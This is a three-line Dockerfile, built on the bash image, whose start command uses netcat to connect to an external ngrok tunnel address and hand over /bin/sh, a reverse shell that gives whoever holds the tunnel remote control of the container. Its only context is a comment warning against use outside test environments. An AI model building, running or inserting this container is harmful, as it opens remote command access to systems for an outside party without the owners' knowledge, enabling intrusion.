FROM bash:latest
# Don't use outside of test environments
CMD nc 4.tcp.eu.ngrok.io 19101 -e /bin/sh
